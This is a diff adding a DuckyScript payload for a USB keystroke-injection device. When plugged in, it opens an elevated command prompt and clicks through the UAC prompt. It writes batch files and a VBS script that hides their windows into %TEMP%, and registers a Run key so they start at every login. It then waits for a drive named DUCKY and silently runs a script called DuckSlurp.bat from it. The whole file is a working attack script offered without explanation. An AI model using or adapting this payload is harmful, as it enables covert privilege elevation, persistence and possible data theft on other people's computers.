@@ -1,0 +1,127 @@
+REM Purpose : Run an executable file off of the SD card after it mounts
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell Start-Process cmd.exe -Verb runAs
+ENTER
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+STRING CD %TEMP%
+ENTER
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+STRING :while1
+ENTER
+STRING @echo off
+ENTER
+STRING :while1
+ENTER
+STRING set DUCKYdrive=loop
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
+ENTER
+STRING if [%DUCKYdrive%] EQU [loop] (
+ENTER
+STRING timeout /t 3
+ENTER
+STRING goto :while1
+ENTER
+STRING ) else (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 3
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING START wscript.exe invis.vbs %DUCKYdrive%\DuckSlurp.bat
+ENTER
+STRING exit
+ENTER
+CONTROL Z
+ENTER
+STRING erase /Q duckyreplay.bat
+ENTER
+STRING copy con duckyreplay.bat
+ENTER
+STRING :while1
+ENTER
+STRING timeout /t 5
+ENTER
+STRING set replay=yes
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set replay=no)
+ENTER
+STRING if [%replay%] EQU [no] (
+ENTER
+STRING echo loop
+ENTER
+STRING goto :while1
+ENTER
+STRING ) else (
+ENTER
+STRING echo break
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING timeout /t 3
+ENTER
+STRING Start wscript.exe invis.vbs DuckyWait.bat
+ENTER
+STRING exit
+ENTER
+CONTROL Z
+ENTER
+STRING erase /Q duckyboot.bat
+ENTER
+STRING copy con duckyboot.bat
+ENTER
+STRING @echo off
+ENTER
+STRING START powershell Start-Process %temp%\duckyloop.bat -verb runAs
+ENTER
+STRING exit
+ENTER
+CONTROL Z
+ENTER
+STRING erase /Q duckyloop.bat
+ENTER
+STRING copy con duckyloop.bat
+ENTER
+STRING @echo off
+ENTER
+STRING wscript.exe %temp%\invis.vbs %temp%\DuckyWAit.bat
+ENTER
+STRING exit
+ENTER
+CONTROL Z
+ENTER
+STRING erase /Q invis.vbs
+ENTER
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL Z
+ENTER
+STRING reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RUN /v Duckyloop /d %temp%\duckyboot.bat
+ENTER
+STRING wscript.exe invis.vbs DuckyWait.bat
+ENTER
+STRING EXIT
+ENTER
